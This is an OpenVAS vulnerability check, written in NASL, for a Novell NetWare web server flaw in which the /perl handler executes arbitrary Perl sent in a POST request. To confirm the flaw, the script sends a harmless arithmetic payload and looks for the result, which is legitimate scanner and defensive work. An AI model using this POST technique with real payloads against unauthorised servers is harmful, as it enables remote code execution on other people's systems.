# OpenVAS Vulnerability Test
# $Id: netware_post_perl.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Novell NetWare HTTP POST Perl Code Execution Vulnerability
#
# Authors:
# visigoth <visigoth@securitycentric.com>
#
# Copyright:
# Copyright (C) 2002 visigoth
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Novell Netware contains multiple default web server installations.  
The Netware Enterprise Web Server (Netscape/IPlanet) has a perl 
handler which will run arbitrary code given to in a POST request 
version 5.x (through SP4) and 6.x (through SP1) are effected.";

tag_solution = "Install 5.x SP5 or 6.0 SP2

Additionally, the enterprise manager web interface may be used to
unmap the /perl handler entirely.  If it is not being used, minimizing
this service would be appropriate.";


#
# REGISTER
#
if(description)
{
 script_id(11158);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5520, 5521, 5522);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2002-1436", "CVE-2002-1437", "CVE-2002-1438"); 
 
 name = "Novell NetWare HTTP POST Perl Code Execution Vulnerability";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Webserver perl handler executes arbitrary POSTs";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2002 visigoth");

 family = "Netware";
 script_family(family);

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www",80,2200);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# ATTACK
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if (! get_port_state(port)) port = 2200;
if (! get_port_state(port)) exit(0);


http_POST = string("POST /perl/ HTTP/1.1\r\n",
	 	   "Content-Type: application/octet-stream\r\n",
		   "Host: ", get_host_name(), "\r\n",
		   "Content-Length: ");

perl_code = 'print("Content-Type: text/plain\\r\\n\\r\\n", "OpenVAS=", 42+42);';

length = strlen(perl_code);
data = string(http_POST, length ,"\r\n\r\n",  perl_code);
rcv = http_keepalive_send_recv(port:port, data:data);
if(!rcv) exit(0);

if("OpenVAS=84" >< rcv)
{
	security_hole(port);
}
